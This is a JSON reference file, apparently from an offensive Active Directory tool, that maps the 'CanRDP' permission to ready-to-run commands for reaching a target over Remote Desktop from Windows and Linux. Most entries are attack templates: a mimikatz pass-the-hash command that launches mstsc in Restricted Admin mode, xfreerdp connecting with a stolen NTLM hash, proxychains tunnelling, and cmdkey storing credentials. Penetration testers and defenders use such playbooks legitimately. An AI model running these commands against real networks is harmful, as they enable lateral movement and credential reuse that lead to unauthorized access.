{
    "CanRDP": {
        "meaning": "Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.",
        "common": "",
        "windows": {
            "RDPClient": [
                {
                    "order": 1,
                    "command": "mstsc.exe",
                    "description": "Open Windows Remote Desktop Client with plaintext credentials"
                }
            ],
            "MimikatzPTH": [
                {
                    "order": 1,
                    "command": "lsadump::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:\"mstsc.exe /restrictedadmin\"",
                    "description": "Use mimikatz pass-the-hash with RDP in Restricted Admin Mode"
                }
            ],
            "CmdLine": [
                {
                    "order": 1,
                    "command": "cmdkey /generic:TERMSRV/target-computer /user:domain\\username /pass:password",
                    "description": "Store RDP credentials in Windows Credential Manager"
                },
                {
                    "order": 2,
                    "command": "mstsc /v:target-computer",
                    "description": "Connect using stored credentials"
                }
            ]
        },
        "linux": {
            "XFreeRDP": [
                {
                    "order": 1,
                    "command": "xfreerdp /u:dfm /d:testlab.local /v:<computer ip>",
                    "description": "Connect with plaintext credentials using xfreerdp"
                }
            ],
            "XFreeRDPPTH": [
                {
                    "order": 1,
                    "command": "xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>",
                    "description": "Connect with NTLM hash using xfreerdp (requires Restricted Admin Mode)"
                }
            ],
            "ProxyChains": [
                {
                    "order": 1,
                    "command": "proxychains xfreerdp /u:dfm /d:testlab.local /v:<computer ip>",
                    "description": "Connect through proxy using proxychains with plaintext credentials"
                },
                {
                    "order": 2,
                    "command": "proxychains xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>",
                    "description": "Connect through proxy using proxychains with NTLM hash"
                }
            ],
            "Rdesktop": [
                {
                    "order": 1,
                    "command": "rdesktop -u dfm -d testlab.local -p password <computer ip>",
                    "description": "Connect using rdesktop with plaintext credentials"
                }
            ]
        }
    }
}
